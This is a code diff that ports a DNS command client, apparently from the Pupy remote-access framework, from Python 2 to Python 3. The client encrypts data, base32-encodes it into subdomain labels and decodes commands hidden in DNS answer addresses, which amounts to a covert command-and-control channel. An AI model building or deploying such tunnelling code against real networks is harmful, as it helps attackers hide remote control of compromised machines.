@@ -4,11 +4,13 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 __all__ = (
     'DnsCommandsClient',
 )
 
 import struct
+import string
 import socket
 import base64
 import hashlib
@@ -137,15 +139,16 @@ class DnsCommandsClient(Thread):
         self.domain = self.domains[self.domain_id]
         self.translation = dict(zip(
             ''.join([
-                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
-                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
-                '=',
-            ]),
+                string.ascii_uppercase,
+                string.digits,
+                '='
+            ]).encode('ascii'),
             ''.join([
-                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
+                string.ascii_lowercase,
                 '-',
-                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
-            ])))
+                string.digits
+            ]).encode('ascii')
+        ))
 
         self.encoder = ECPV(public_key=key, curve='brainpoolP224r1')
         self.spi = None
@@ -280,7 +283,8 @@ class DnsCommandsClient(Thread):
         resp = len(addresses)*[None]
         for address in addresses:
             raw = 0
-            for part in [int(x) << (3-i)*8 for i,x in enumerate(address.split('.'))]:
+            for part in [int(x) << (3-i)*8 for i,x in enumerate(
+                    address.split(b'.'))]:
                 raw |= part
 
             idx = (raw & 0x3E000000) >> 25
@@ -295,7 +299,7 @@ class DnsCommandsClient(Thread):
         return self.encoder.decode(payload, nonce, symmetric)
 
     def _q_page_encoder(self, data):
-        data_append = ''
+        data_append = b''
         ldata = len(data)
 
         if ldata > 35:
@@ -314,15 +318,23 @@ class DnsCommandsClient(Thread):
                     ldata, 35)
 
         nonce = self.nonce
-        node_block = ''
+        node_block = b''
 
         if CLIENT_VERSION > 1:
-            node_block = data_append + struct.pack(
-                '>BIH', CLIENT_VERSION, pupy.client.cid, self.iid)
+            node_block = b''.join((
+                data_append,
+                struct.pack(
+                    '>BIH',
+                    CLIENT_VERSION, pupy.client.cid, self.iid
+                ),
+                to_bytes(self.node, 6)
+            ))
 
-            node_block += to_bytes(self.node, 6)
+        payload = self.encoder.encode(
+            data + node_block, nonce,
+            symmetric=True
+        )
 
-        payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
         payload_len = len(payload)
 
         if node_block:
@@ -330,14 +342,16 @@ class DnsCommandsClient(Thread):
             split_offset = payload_len - len_node_block
             payload, node_block = payload[:split_offset], payload[split_offset:]
 
+        parts = [
+            struct.pack('>I', self.spi) if self.spi else None,
+            struct.pack('>I', nonce) + node_block,
+            payload
+        ]
+
         encoded = '.'.join([
-            ''.join([
+            ''.join(
                 self.translation[x] for x in base64.b32encode(part)
-            ]) for part in [
-                struct.pack('>I', self.spi) if self.spi else None,
-                struct.pack('>I', nonce) + node_block,
-                payload
-            ] if part is not None
+            ) for part in parts if part is not None
         ]) + '.' + self.domain
 
         self.nonce += payload_len
@@ -402,7 +416,7 @@ class DnsCommandsClient(Thread):
 
         response = None
 
-        for attempt in xrange(2):
+        for attempt in (1, 2):
             try:
                 decoder = None
 
